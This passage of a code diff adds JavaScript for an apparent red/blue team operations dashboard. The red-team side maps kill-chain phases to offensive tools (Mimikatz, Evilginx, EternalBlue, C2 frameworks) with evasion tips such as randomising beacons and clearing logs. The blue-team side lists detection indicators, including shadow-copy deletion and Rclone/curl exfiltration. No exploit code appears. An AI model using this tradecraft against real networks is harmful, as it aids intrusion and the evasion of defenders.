+    {n:"Phishing docs",t:[{l:"GoPhish",u:"https://getgophish.com"},{l:"macro_pack",u:"https://github.com/sevagas/macro_pack"}],f:"Mark-of-the-web, Protected View"},
+    {n:"LOLBIN abuse",t:[{l:"LOLBAS Project",u:"https://lolbas-project.github.io"},{l:"GTFOBins",u:"https://gtfobins.github.io"}],f:"Allowlisted but widely monitored"},
+   ],
+   app:"Match payload to delivery vector. Staged payloads reduce footprint. Test against AV offline.",
+   ioc:"Known shellcode signatures. Regular C2 beacon intervals. Unsigned binaries.",url:"https://attack.mitre.org/tactics/TA0001/"},
+  {id:"delivery",cls:"p-d",lbl:"03 - DELIVERY",noise:2,obj:"Get payload to target via phishing, exposed services, supply chain, or physical access.",
+   techs:[
+    {n:"Spearphishing",t:[{l:"GoPhish",u:"https://getgophish.com"},{l:"Evilginx",u:"https://github.com/kgretzky/evilginx2"}],f:"SPF/DKIM/DMARC checks, mail sandbox"},
+    {n:"Web exploit delivery",t:[{l:"Exploit-DB",u:"https://www.exploit-db.com"},{l:"Metasploit",u:"https://docs.metasploit.com"}],f:"WAF, proxy inspection"},
+    {n:"Exposed services",t:[{l:"SearchSploit",u:"https://www.exploit-db.com/searchsploit"}],f:"IDS/IPS, fail2ban, SIEM"},
+    {n:"USB / physical",t:[{l:"Hak5 docs",u:"https://docs.hak5.org"}],f:"Physical access logs, CCTV"},
+   ],
+   app:"Verify SPF/DMARC before phishing. Time delivery to business hours. Only exploit CVEs on confirmed versions.",
+   ioc:"Mass phishing volume caught by gateway. Exploit attempts trigger WAF/IDS.",url:"https://attack.mitre.org/tactics/TA0001/"},
+  {id:"exploit",cls:"p-e",lbl:"04 - EXPLOITATION",noise:3,obj:"Execute payload. Achieve initial code execution on target system.",
+   techs:[
+    {n:"SQL Injection",t:[{l:"sqlmap",u:"https://sqlmap.org"},{l:"Burp Suite",u:"https://portswigger.net/burp"}],f:"WAF rules, database query logging"},
+    {n:"EternalBlue",t:[{l:"Rapid7 module",u:"https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/"}],f:"HIGH -- can crash SMBv1 hosts"},
+    {n:"SSRF",t:[{l:"Burp Suite",u:"https://portswigger.net/burp"},{l:"SSRFmap",u:"https://github.com/swisskyrepo/SSRFmap"}],f:"App logs, WAF -- chain to metadata"},
+    {n:"RCE / Webshells",t:[{l:"PayloadsAllTheThings",u:"https://github.com/swisskyrepo/PayloadsAllTheThings"}],f:"Web server logs, EDR file creation"},
+    {n:"LDAP Injection",t:[{l:"Burp Suite",u:"https://portswigger.net/burp"}],f:"App logs -- often missed on corporate apps"},
+   ],
+   app:"Verify exact version before exploit. EternalBlue can crash hosts. Test SQLi in Burp before sqlmap.",
+   ioc:"Failed login spikes. IDS signatures on Metasploit. SMBv1 crashes immediately visible.",url:"https://attack.mitre.org/tactics/TA0002/"},
+  {id:"install",cls:"p-i",lbl:"05 - PERSISTENCE",noise:2,obj:"Establish persistence. Survive reboots. Maintain access independently of initial exploit.",
+   techs:[
+    {n:"Scheduled tasks",t:[{l:"schtasks docs",u:"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"}],f:"Task scheduler event logs (4698)"},
+    {n:"Registry run keys",t:[{l:"PayloadsAllTheThings",u:"https://github.com/swisskyrepo/PayloadsAllTheThings"}],f:"Heavily monitored -- common IOC"},
+    {n:"Golden Ticket",t:[{l:"Mimikatz",u:"https://github.com/gentilkiwi/mimikatz"},{l:"Rubeus",u:"https://github.com/GhostPack/Rubeus"}],f:"Requires KRBTGT hash -- post-DA only"},
+    {n:"DCSync rights",t:[{l:"PowerView",u:"https://github.com/PowerShellMafia/PowerSploit"},{l:"Impacket",u:"https://github.com/fortra/impacket"}],f:"Subtle -- ACL audit catches it"},
+    {n:"Linux cron / systemd",t:[{l:"GTFOBins",u:"https://gtfobins.github.io"}],f:"See Linux tab for full playbook"},
+   ],
+   app:"Multiple mechanisms across different accounts. Golden Ticket survives DA password resets. DCSync backdoor subtle and persistent.",
+   ioc:"Task creation (4698). Registry modifications. New privileged account (4720). Log cleared (1102).",url:"https://attack.mitre.org/tactics/TA0003/"},
+  {id:"c2",cls:"p-c",lbl:"06 - C2",noise:2,obj:"Establish reliable comms to attacker infrastructure. Blend with normal traffic.",
+   techs:[
+    {n:"HTTPS C2",t:[{l:"Havoc C2",u:"https://github.com/HavocFramework/Havoc"},{l:"Sliver",u:"https://github.com/BishopFox/sliver"},{l:"Mythic",u:"https://github.com/its-a-feature/Mythic"}],f:"JA3 fingerprinting, DPI, cert inspection"},
+    {n:"DNS C2",t:[{l:"dnscat2",u:"https://github.com/iagox86/dnscat2"},{l:"iodine",u:"https://github.com/yarrick/iodine"}],f:"DNS query volume anomaly -- inherently slow"},
+    {n:"SMB named pipes",t:[{l:"Cobalt Strike docs",u:"https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_smb-dns-beacons.htm"}],f:"Blends with AD traffic -- low noise"},
+    {n:"Pivot tunnels",t:[{l:"Ligolo-ng",u:"https://github.com/nicocha30/ligolo-ng"},{l:"Chisel",u:"https://github.com/jpillora/chisel"}],f:"Watch for TUN interface anomaly"},
+   ],
+   app:"Domain fronting hides C2 behind CDN. Randomise beacon intervals. Use aged categorised domains.",
+   ioc:"Regular beacon intervals. Uncategorised domains. High DNS query rate.",url:"https://attack.mitre.org/tactics/TA0011/"},
+  {id:"actions",cls:"p-a",lbl:"07 - ACTIONS ON OBJECTIVES",noise:3,obj:"Complete goals -- lateral movement, priv esc, data access, exfil. Cover tracks on exit.",
+   techs:[
+    {n:"Kerberoasting",t:[{l:"Rubeus",u:"https://github.com/GhostPack/Rubeus"},{l:"Impacket GetUserSPNs",u:"https://github.com/fortra/impacket"}],f:"Ticket request volume logged if high"},
+    {n:"Pass-the-Hash",t:[{l:"Mimikatz",u:"https://github.com/gentilkiwi/mimikatz"},{l:"CrackMapExec",u:"https://github.com/byt3bl33d3r/CrackMapExec"}],f:"Logon type 3 events, ATA/Defender"},
+    {n:"BloodHound",t:[{l:"BloodHound CE",u:"https://github.com/SpecterOps/BloodHound"},{l:"SharpHound",u:"https://github.com/BloodHoundAD/SharpHound"}],f:"LDAP query volume -- collector noisy"},
+    {n:"DCSync",t:[{l:"Mimikatz",u:"https://github.com/gentilkiwi/mimikatz"},{l:"Impacket secretsdump",u:"https://github.com/fortra/impacket"}],f:"Replication events -- Defender watches hard"},
+    {n:"LSASS dump",t:[{l:"Mimikatz",u:"https://github.com/gentilkiwi/mimikatz"},{l:"ProcDump",u:"https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"}],f:"EDR watches LSASS -- highest detection risk"},
+    {n:"Exfiltration",t:[{l:"Rclone",u:"https://rclone.org"},{l:"dnscat2",u:"https://github.com/iagox86/dnscat2"}],f:"DLP, data volume anomaly, CASB"},
+   ],
+   app:"BloodHound first. Kerberoast offline. DCSync from non-DC = high alert. Exfil during business hours. Clean logs last.",
+   ioc:"LSASS access by non-system process. DCSync from non-DC. Mass data movement. Event log gaps.",url:"https://attack.mitre.org/tactics/TA0009/"}
+];
+
+var BP=[
+  {id:"bp-per",cls:"b-p",lbl:"01 - PERIMETER DETECTION",obj:"Detect external reconnaissance against your estate.",
+   techs:[
+    {n:"DNS monitoring",t:[{l:"SecurityTrails",u:"https://securitytrails.com"},{l:"DomainTools",u:"https://www.domaintools.com"}],f:"AXFR attempts, unusual query volume"},
+    {n:"Attack surface mgmt",t:[{l:"Nuclei",u:"https://nuclei.projectdiscovery.io"},{l:"Shodan Monitor",u:"https://monitor.shodan.io"}],f:"Know your own exposed surface"},
+    {n:"WAF / IDS",t:[{l:"Suricata",u:"https://suricata.io"},{l:"ModSecurity",u:"https://modsecurity.org"}],f:"Scanner signatures, high request rates"},
+   ],
+   app:"Regular external scans of your own estate. AXFR monitoring on nameservers. Shodan alerts for new exposed services.",
+   ioc:"Port scan patterns. AXFR attempts. Unusual DNS volume against your domains.",url:"https://attack.mitre.org/mitigations/M1056/"},
+  {id:"bp-id",cls:"b-i",lbl:"02 - IDENTITY AND ACCESS",obj:"Detect credential attacks, privilege escalation, and suspicious authentication.",
+   techs:[
+    {n:"Failed login monitoring",t:[{l:"Microsoft Sentinel",u:"https://learn.microsoft.com/en-us/azure/sentinel/"},{l:"Elastic SIEM",u:"https://www.elastic.co/siem"}],f:"EventID 4625 -- set volume threshold"},
+    {n:"Kerberos anomalies",t:[{l:"Defender for Identity",u:"https://learn.microsoft.com/en-us/defender-for-identity/"},{l:"BloodHound CE",u:"https://github.com/SpecterOps/BloodHound"}],f:"4769 RC4 = Kerberoasting"},
+    {n:"Privileged account audit",t:[{l:"PingCastle",u:"https://www.pingcastle.com"},{l:"Purple Knight",u:"https://www.purple-knight.com"}],f:"DA membership changes, new admins"},
+    {n:"MFA enforcement",t:[{l:"Duo Security",u:"https://duo.com"},{l:"Microsoft Entra",u:"https://entra.microsoft.com"}],f:"MFA fatigue -- monitor push spam"},
+   ],
+   app:"Alert on 4625 spikes. Monitor 4769 RC4. Audit DA group membership changes. Enforce MFA everywhere.",
+   ioc:"4625 spikes. 4769 RC4. 4648 explicit creds. New DA members (4732). NTLM in modern env.",url:"https://attack.mitre.org/mitigations/M1032/"},
+  {id:"bp-ep",cls:"b-e",lbl:"03 - ENDPOINT DETECTION",obj:"Detect malicious execution, persistence, and credential dumping.",
+   techs:[
+    {n:"EDR deployment",t:[{l:"Defender for Endpoint",u:"https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint"},{l:"CrowdStrike",u:"https://www.crowdstrike.com"}],f:"LSASS access, process injection"},
+    {n:"Sysmon",t:[{l:"Sysmon",u:"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"},{l:"Olaf config",u:"https://github.com/olafhartong/sysmon-modular"}],f:"Event 10 (LSASS), Event 1 (process)"},
+    {n:"LSASS protection",t:[{l:"Credential Guard",u:"https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/"},{l:"RunAsPPL",u:"https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection"}],f:"Sysmon Event 10, EDR LSASS alert"},
+    {n:"AppLocker / WDAC",t:[{l:"WDAC Wizard",u:"https://webapp-wdac-wizard.azurewebsites.net"}],f:"LOLBIN abuse -- whitelist by hash/path"},
+   ],
+   app:"Deploy Sysmon with hardened config. Enable command line logging in 4688. LSASS via Credential Guard or PPL.",
+   ioc:"Sysmon Event 10 on LSASS. 4688 cmd from Office. Task creation (4698). New service (7045).",url:"https://attack.mitre.org/mitigations/M1049/"},
+  {id:"bp-net",cls:"b-n",lbl:"04 - NETWORK MONITORING",obj:"Detect lateral movement, C2 traffic, and unusual network behaviour.",
+   techs:[
+    {n:"SMB monitoring",t:[{l:"Zeek",u:"https://zeek.org"},{l:"Suricata",u:"https://suricata.io"}],f:"Lateral movement -- unusual SMB chains"},
+    {n:"DNS sinkholing",t:[{l:"Response Policy Zones",u:"https://www.isc.org/rpz/"},{l:"Pi-hole",u:"https://pi-hole.net"}],f:"C2 DNS beaconing -- regular intervals"},
+    {n:"JA3 / TLS inspection",t:[{l:"Zeek JA3",u:"https://github.com/salesforce/ja3"},{l:"RITA",u:"https://github.com/activecm/rita"}],f:"SSH on 443, known C2 JA3 fingerprints"},
+   ],
+   app:"Baseline normal DNS patterns. Alert on regular intervals to new domains. JA3 fingerprint C2 frameworks.",
+   ioc:"Regular DNS to new domains. Rapid SMB logins. Outbound on unusual ports. TLS to uncategorised domains.",url:"https://attack.mitre.org/mitigations/M1031/"},
+  {id:"bp-dat",cls:"b-d",lbl:"05 - DATA PROTECTION",obj:"Prevent and detect data exfiltration and sensitive data movement.",
+   techs:[
+    {n:"DLP",t:[{l:"Microsoft Purview",u:"https://learn.microsoft.com/en-us/purview/"},{l:"Nightfall",u:"https://www.nightfall.ai"}],f:"Volume thresholds, sensitive data patterns"},
+    {n:"CASB",t:[{l:"Defender for Cloud Apps",u:"https://learn.microsoft.com/en-us/defender-cloud-apps/"},{l:"Netskope",u:"https://www.netskope.com"}],f:"Sanctioned vs unsanctioned cloud"},
+    {n:"Backup monitoring",t:[{l:"Veeam",u:"https://www.veeam.com"}],f:"Ransomware -- backup deletion (vssadmin)"},
+   ],
+   app:"Alert on mass file access. Large uploads to personal cloud. vssadmin delete shadows.",
+   ioc:"Mass file access short window. Large personal cloud upload. vssadmin delete shadows. Rclone/curl exfil.",url:"https://attack.mitre.org/mitigations/M1057/"},
+  {id:"bp-ir",cls:"b-r",lbl:"06 - INCIDENT RESPONSE",obj:"Contain, eradicate, recover. Preserve evidence and minimise impact.",
+   techs:[
+    {n:"Triage and scoping",t:[{l:"Velociraptor",u:"https://docs.velociraptor.app"},{l:"KAPE",u:"https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape"}],f:"Scope before containment -- know blast radius"},
+    {n:"Memory forensics",t:[{l:"Volatility",u:"https://www.volatilityfoundation.org"},{l:"WinPmem",u:"https://github.com/Velocidex/WinPmem"}],f:"Dump before shutdown -- volatile artefacts lost"},
+    {n:"IR case management",t:[{l:"TheHive",u:"https://thehive-project.org"},{l:"DFIR.training",u:"https://www.dfir.training"}],f:"Document everything end-to-end"},
+   ],
+   app:"Scope first. Memory dump before shutdown. Document in case management. Lessons learned after every incident.",
+   ioc:"C2 IPs/domains. Malware hashes. Affected hostnames. Attacker TTPs. Persistence mechanisms found.",url:"https://attack.mitre.org/tactics/TA0040/"}
+];
+
+var SC={none:{l:"--",c:"#2d3748"},recon:{l:"RECON",c:"#58a6ff"},active:{l:"ACTIVE",c:"#f0a500"},done:{l:"DONE",c:"#00ff88"},owned:{l:"OWNED",c:"#bf5af2"}};
+var SW={none:"2%",recon:"25%",active:"60%",done:"90%",owned:"100%"};
+var rStat={}, bStat={};
+RP.forEach(function(p){ rStat[p.id]="none"; });
+BP.forEach(function(p){ bStat[p.id]="none"; });
+
+function renderPhases(phases, cid, prefix) {
+  var c=document.getElementById(cid); if(!c) return; c.innerHTML="";
+  phases.forEach(function(p) {
+    var isRed=prefix==="r", noise=p.noise||0;
+    var dc=noise===1?"low":noise===2?"med":"hi";
+    var nl=noise===1?"LOW":noise===2?"MED":"HIGH";
+    var dots=isRed?[1,2,3].map(function(i){return '<div class="nd '+(i<=noise?dc:'')+'"></div>';}).join(""):"";
+    var noiseHtml=isRed?'<div class="nrow"><span class="nlbl">NOISE</span><div class="ndots">'+dots+'</div><span style="font-size:9px;color:#4a5568;">'+nl+'</span></div>':"";
+    var techsHtml=p.techs.map(function(t,ti){
+      var links=t.t.map(function(lk){return '<a class="tl" href="'+lk.u+'" target="_blank" rel="noopener noreferrer">'+lk.l+'</a>';}).join("");
+      var fc=isRed?"#ff453a":"#f0a500";
+      return '<div class="ti" id="ti-'+prefix+'-'+p.id+'-'+ti+'"><div class="tchk"><input type="checkbox" onchange="chkT(this,\'ti-'+prefix+'-'+p.id+'-'+ti+'\')"></div><div class="tcont"><div class="tname">'+t.n+'</div><div class="ttools">[tools] '+links+'</div><div class="tflags" style="color:'+fc+';">[!] '+t.f+'</div></div></div>';
+    }).join("");
+    var col2l=isRed?"IOCs / RED FLAGS":"KEY IOCs", col2c=isRed?"cbody dng":"cbody ioc";
+    var col3=isRed?"":'<div><div class="clbl">SIEM QUERIES</div><div class="cbody siem">'+(p.siem||"")+'</div></div>';
+    var el=document.createElement("div"); el.className="phase "+p.cls;
+    el.innerHTML='<div class="phdr" onclick="togP(\''+prefix+'-'+p.id+'\')"><span class="ptitle">'+p.lbl+'</span><div class="pright">'+noiseHtml+'<span class="ptog" id="ptog-'+prefix+'-'+p.id+'">+</span></div></div><div class="pbody" id="pb-'+prefix+'-'+p.id+'"><div class="pobj">'+p.obj+'</div><div class="tlist">'+techsHtml+'</div><div class="pcols"><div><div class="clbl">APPROACHES</div><div class="cbody">'+p.app+'</div></div><div><div class="clbl">'+col2l+'</div><div class="'+col2c+'">'+p.ioc+'</div></div>'+col3+'</div><div class="clbl" style="margin-bottom:4px;">'+(isRed?"FINDINGS":"DETECTION NOTES")+'</div><textarea class="fta" placeholder="'+(isRed?"Log confirmed findings...":"Confirmed detections, tuning notes...")+'"></textarea><a class="mlnk" href="'+p.url+'" target="_blank" rel="noopener noreferrer">^ MITRE REFERENCE</a></div>';
+    c.appendChild(el);
+  });
+}
+
+function togP(id){var b=document.getElementById("pb-"+id),t=document.getElementById("ptog-"+id);if(!b)return;var o=b.classList.contains("open");b.classList.toggle("open",!o);t.textContent=o?"+":"-";}
+function chkT(cb,id){var el=document.getElementById(id);if(el)el.classList.toggle("confirmed",cb.checked);}
+
+function renderProg(){
+  var phases=mode==="red"?RP:BP, sm=mode==="red"?rStat:bStat;
+  document.getElementById("progD").innerHTML=phases.map(function(p){var s=sm[p.id],cfg=SC[s];return '<div class="pi"><span class="pname" style="color:'+cfg.c+';font-size:9px;">'+p.lbl+'</span><div class="ptrack"><div class="pfill" style="width:'+SW[s]+';background:'+cfg.c+';"></div></div><span class="pstat" style="color:'+cfg.c+';font-size:9px;">'+cfg.l+'</span></div>';}).join("");
+}
+function renderPhCtrl(){
+  var phases=mode==="red"?RP:BP, sm=mode==="red"?rStat:bStat;
+  document.getElementById("phCtrl").innerHTML=phases.map(function(p){var btns=Object.keys(SC).map(function(s){var sel=sm[p.id]===s;return '<button class="pcb '+(sel?"s-"+s:"")+'" onclick="setPS(\''+p.id+'\',\''+s+'\')">'+SC[s].l+'</button>';}).join("");return '<div class="pci"><div class="pcn">'+p.lbl+'</div><div class="pcbs">'+btns+'</div></div>';}).join("");
+}
+function setPS(id,s){var sm=mode==="red"?rStat:bStat;sm[id]=s;renderProg();renderPhCtrl();addLogE("["+mode.toUpperCase()+"] "+id+" -> "+SC[s].l);}
+
+var BM=[
+  {cat:"RECON & OSINT",col:"#f0a500",items:[{l:"Shodan",u:"https://www.shodan.io",tag:"scan"},{l:"Censys",u:"https://search.censys.io",tag:"scan"},{l:"crt.sh",u:"https://crt.sh",tag:"cert"},{l:"DNSDumpster",u:"https://dnsdumpster.com",tag:"dns"},{l:"BGP Hurricane Electric",u:"https://bgp.he.net",tag:"asn"},{l:"Grayhatwarfare",u:"https://grayhatwarfare.com",tag:"cloud"},{l:"Wayback Machine",u:"https://web.archive.org",tag:"archive"},{l:"theHarvester",u:"https://github.com/laramies/theHarvester",tag:"osint"}]},
+  {cat:"EXPLOITATION",col:"#ff453a",items:[{l:"Exploit-DB",u:"https://www.exploit-db.com",tag:"exploits"},{l:"NVD NIST",u:"https://nvd.nist.gov/vuln/search",tag:"cve"},{l:"CISA KEV",u:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog",tag:"kev"},{l:"PayloadsAllTheThings",u:"https://github.com/swisskyrepo/PayloadsAllTheThings",tag:"payloads"},{l:"LOLBAS Project",u:"https://lolbas-project.github.io",tag:"lolbin"},{l:"GTFOBins",u:"https://gtfobins.github.io",tag:"unix"},{l:"HackTricks",u:"https://book.hacktricks.xyz",tag:"guide"},{l:"LinPEAS",u:"https://github.com/carlospolop/PEASS-ng",tag:"enum"}]},
+  {cat:"AD / WINDOWS",col:"#58a6ff",items:[{l:"BloodHound CE",u:"https://github.com/SpecterOps/BloodHound",tag:"AD"},{l:"Impacket",u:"https://github.com/fortra/impacket",tag:"toolkit"},{l:"Rubeus",u:"https://github.com/GhostPack/Rubeus",tag:"kerberos"},{l:"Mimikatz",u:"https://github.com/gentilkiwi/mimikatz",tag:"creds"},{l:"PowerSploit",u:"https://github.com/PowerShellMafia/PowerSploit",tag:"ps"},{l:"PingCastle",u:"https://www.pingcastle.com",tag:"audit"}]},
+  {cat:"WEB APP",col:"#bf5af2",items:[{l:"Burp Suite",u:"https://portswigger.net/burp",tag:"proxy"},{l:"OWASP Top 10",u:"https://owasp.org/www-project-top-ten/",tag:"owasp"},{l:"sqlmap",u:"https://sqlmap.org",tag:"sqli"},{l:"Gobuster",u:"https://github.com/OJ/gobuster",tag:"brute"},{l:"Feroxbuster",u:"https://github.com/epi052/feroxbuster",tag:"brute"}]},
+  {cat:"BLUE TEAM",col:"#00ff88",items:[{l:"MITRE ATT&CK",u:"https://attack.mitre.org",tag:"framework"},{l:"MITRE D3FEND",u:"https://d3fend.mitre.org",tag:"defence"},{l:"Sigma Rules",u:"https://github.com/SigmaHQ/sigma",tag:"detect"},{l:"Velociraptor",u:"https://docs.velociraptor.app",tag:"dfir"},{l:"TheHive",u:"https://thehive-project.org",tag:"ir"},{l:"MISP",u:"https://www.misp-project.org",tag:"intel"},{l:"Elastic SIEM",u:"https://www.elastic.co/siem",tag:"siem"},{l:"CISA Advisories",u:"https://www.cisa.gov/news-events/cybersecurity-advisories",tag:"advisory"}]},
+  {cat:"CVE / INTEL",col:"#ffd60a",items:[{l:"Bleeping Computer",u:"https://www.bleepingcomputer.com",tag:"news"},{l:"Krebs on Security",u:"https://krebsonsecurity.com",tag:"news"},{l:"NVD CVE Search",u:"https://nvd.nist.gov/vuln/search",tag:"cve"},{l:"VulnDB GitHub",u:"https://github.com/trickest/cve",tag:"cve"},{l:"CVEdetails",u:"https://www.cvedetails.com",tag:"cve"}]},
+];
+
+function renderBM(){
+  document.getElementById("bkmarks").innerHTML=BM.map(function(cat){return '<div class="bcat"><div class="bcatlbl">'+cat.cat+'</div>'+cat.items.map(function(item){return '<a class="bitem" href="'+item.u+'" target="_blank" rel="noopener noreferrer"><div class="bdot" style="background:'+cat.col+';"></div><span class="blbl">'+item.l+'</span><span class="btag">'+item.tag+'</span></a>';}).join("")+'</div>';}).join("");
+}
+
+// NMAP BUILDER
+function buildNmap(){
+  var target=document.getElementById("nmapTarget").value.trim()||"<target>";
+  var scantype=""; var stEls=document.getElementsByName("scantype"); for(var i=0;i<stEls.length;i++){if(stEls[i].checked){scantype=stEls[i].value;break;}}
+  var portrange=""; var prEls=document.getElementsByName("portrange"); for(var i=0;i<prEls.length;i++){if(prEls[i].checked){portrange=prEls[i].value;break;}}
+  if(portrange==="CUSTOM"){portrange=document.getElementById("nmapCustomPort").value.trim();}
+  var timing=""; var tEls=document.getElementsByName("timing"); for(var i=0;i<tEls.length;i++){if(tEls[i].checked){timing=tEls[i].value;break;}}
+  var outfmt=""; var ofEls=document.getElementsByName("outfmt"); for(var i=0;i<ofEls.length;i++){if(ofEls[i].checked){outfmt=ofEls[i].value;break;}}
+  var outfile=document.getElementById("nmapOutput").value.trim()||"scan_output";
+  var flags=[];
+  if(document.getElementById("no-sV").checked) flags.push("-sV");
+  if(document.getElementById("no-O").checked) flags.push("-O");
+  if(document.getElementById("no-sC").checked) flags.push("-sC");
+  if(document.getElementById("no-A").checked) flags.push("-A");
+  if(document.getElementById("no-Pn").checked) flags.push("-Pn");
+  if(document.getElementById("no-n").checked) flags.push("-n");
+  if(document.getElementById("no-v").checked) flags.push("-v");
+  var scripts=[];
+  if(document.getElementById("sc-vuln").checked) scripts.push("vuln");
+  if(document.getElementById("sc-smb").checked) scripts.push("smb-vuln-ms17-010,smb-enum-shares,smb-enum-users,smb2-security-mode");
+  if(document.getElementById("sc-http").checked) scripts.push("http-enum,http-headers");
+  if(document.getElementById("sc-dns").checked) scripts.push("dns-zone-transfer");
+  if(document.getElementById("sc-ftp").checked) scripts.push("ftp-anon");
+  if(document.getElementById("sc-ssh").checked) scripts.push("ssh2-enum-algos");
+  var cmd="nmap "+scantype;
+  if(portrange) cmd+=" "+portrange;
+  if(timing) cmd+=" "+timing;
+  if(flags.length) cmd+=" "+flags.join(" ");
+  if(scripts.length) cmd+=" --script "+scripts.join(",");
+  if(outfmt) cmd+=" "+outfmt+" "+outfile;
+  cmd+=" "+target;
+  document.getElementById("nmapCmd").textContent=cmd;
+}
+
+function copyNmap(){
+  var cmd=document.getElementById("nmapCmd").textContent;
+  navigator.clipboard.writeText(cmd).then(function(){
+    var hint=document.getElementById("nmapCopyHint");
+    hint.textContent="Copied!"; hint.style.color="#00ff88";
+    setTimeout(function(){hint.textContent="Click command to copy to clipboard";hint.style.color="#4a5568";},2000);
+  });
+}
+
+function copyCmd(el){
+  navigator.clipboard.writeText(el.textContent).then(function(){
+    var orig=el.style.borderLeftColor;
+    el.style.borderLeftColor="#00ff88";
+    el.style.color="#ffd60a";
+    setTimeout(function(){el.style.borderLeftColor=orig;el.style.color="";},1000);
+  });
+}
+
+// IP MAPPER
+var ips=[];
+function addIP(){var a=document.getElementById("ipA").value.trim();if(!a)return;ips.push({a:a,h:document.getElementById("ipH").value.trim()||"--",n:document.getElementById("ipN").value.trim()||"--",t:document.getElementById("ipT").value});["ipA","ipH","ipN"].forEach(function(id){document.getElementById(id).value="";});renderIPs();}
+function removeIP(i){ips.splice(i,1);renderIPs();}
+function renderIPs(){document.getElementById("ipBody").innerHTML=ips.map(function(ip,i){return '<tr><td style="color:#00ff88;font-weight:bold;font-size:11px;">'+ip.a+'</td><td>'+ip.h+'</td><td><span class="tag '+ip.t+'">'+ip.t.toUpperCase()+'</span></td><td style="color:#8b949e;">'+ip.n+'</td><td><span class="del" onclick="removeIP('+i+')">x</span></td></tr>';}).join("");}
+
+// TUNNELS
+var tchain=[],schains=[];
+var TICONS={entry:"[E]",pivot:"[P]",target:"[T]"};
+function addTN(){var n=document.getElementById("tnN").value.trim();if(!n)return;tchain.push({n:n,t:document.getElementById("tnT").value,p:document.getElementById("tnP").value.trim()});document.getElementById("tnN").value="";document.getElementById("tnP").value="";renderTC();}
+function renderTC(){var c=document.getElementById("tcanv");if(!tchain.length){c.innerHTML='<span style="color:#2d3748;font-size:10px;">Build pivot chain above...</span>';return;}c.innerHTML=tchain.map(function(n,i){return '<span class="tnode '+n.t+'">'+TICONS[n.t]+" "+n.n+(n.p?":"+n.p:"")+'</span>'+(i<tchain.length-1?'<span class="tarr">--></span>':"");}).join("")+'<button class="btn xred" style="margin-left:auto;font-size:9px;" onclick="tchain.pop();renderTC()">UNDO</button>';}
+function saveTC(){if(!tchain.length)return;schains.push(tchain.slice());renderSC();addLogE("Chain saved ("+tchain.length+" hops)");}
+function clearTC(){tchain=[];renderTC();}
+function renderSC(){document.getElementById("savedC").innerHTML=schains.map(function(ch,ci){return '<div class="schain">'+ch.map(function(n,i){return '<span class="tnode '+n.t+'" style="padding:2px 6px;font-size:9px;">'+TICONS[n.t]+" "+n.n+'</span>'+(i<ch.length-1?'<span class="tarr">-></span>':"");}).join("")+'<span class="scnote">['+ch.length+' hops]</span><span class="del" style="margin-left:auto;" onclick="schains.splice('+ci+',1);renderSC()">x</span></div>';}).join("");}
+
+// SUBNET
+function doSN(inId,resId){var res=document.getElementById(resId);try{var v=document.getElementById(inId).value.trim();var pts2=v.split("/");var ipStr=pts2[0];var cidr=parseInt(pts2[1]);if(isNaN(cidr)||cidr<0||cidr>32)throw"";var pts=ipStr.split(".").map(Number);if(pts.length!==4||pts.some(function(x){return isNaN(x)||x<0||x>255;}))throw"";var iI=((pts[0]<<24)|(pts[1]<<16)|(pts[2]<<8)|pts[3])>>>0;var mk=cidr===0?0:((0xFFFFFFFF<<(32-cidr))>>>0);var net=(iI&mk)>>>0;var bc=(net|(~mk>>>0))>>>0;var hosts=cidr>=31?(32-cidr===1?2:1):(bc-net-1);var fi=cidr>=31?net:net+1;var li=cidr>=31?bc:bc-1;var toIP=function(n){return [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join(".");};var toMask=function(m){return [(m>>>24)&255,(m>>>16)&255,(m>>>8)&255,m&255].join(".");};res.style.display="block";res.innerHTML=[["Network",toIP(net)+"/"+cidr],["Subnet mask",toMask(mk)],["Broadcast",toIP(bc)],["First host",toIP(fi)],["Last host",toIP(li)],["Usable hosts",hosts.toLocaleString()]].map(function(r){return '<span class="srk">'+r[0].padEnd(14)+'</span><span class="srv">'+r[1]+'</span><br>';}).join("");}catch(e){res.style.display="block";res.innerHTML='<span style="color:#ff453a;">Invalid -- use 192.168.1.0/24</span>';}}
+
+// CLOCKS
+var TZS=[{l:"UK",z:"Europe/London"},{l:"UTC",z:"UTC"},{l:"EST",z:"America/New_York"},{l:"PST",z:"America/Los_Angeles"}];
+function updClocks(){var col=mode==="red"?"#00ff88":"#58a6ff";document.getElementById("clocks").innerHTML=TZS.map(function(tz){var t=new Date().toLocaleTimeString("en-GB",{timeZone:tz.z,hour:"2-digit",minute:"2-digit",second:"2-digit"});return '<div class="ci"><div class="ctz">'+tz.l+'</div><div class="ct" style="color:'+col+';">'+t+'</div></div>';}).join("");}
+
+// TIMER
+var tSecs=0,tRun=false,tInt=null;
+function toggleTimer(){if(tRun){clearInterval(tInt);document.getElementById("tbtn").textContent="START";document.getElementById("tbtn").classList.remove("abtn");document.getElementById("opStat").textContent="PAUSED";}else{tInt=setInterval(function(){tSecs++;var h=String(Math.floor(tSecs/3600)).padStart(2,"0");var m=String(Math.floor((tSecs%3600)/60)).padStart(2,"0");var s=String(tSecs%60).padStart(2,"0");document.getElementById("tdisp").textContent=h+":"+m+":"+s;},1000);document.getElementById("tbtn").textContent="PAUSE";document.getElementById("tbtn").classList.add("abtn");document.getElementById("opStat").textContent="ACTIVE";}tRun=!tRun;}
+function resetTimer(){clearInterval(tInt);tRun=false;tSecs=0;document.getElementById("tdisp").textContent="00:00:00";document.getElementById("tbtn").textContent="START";document.getElementById("tbtn").classList.remove("abtn");document.getElementById("opStat").textContent="STANDBY";}
+
+// OP LOG
+var logE=[];
+function addLog(){var el=document.getElementById("lin");var t=el.value.trim();if(!t)return;addLogE(t);el.value="";}
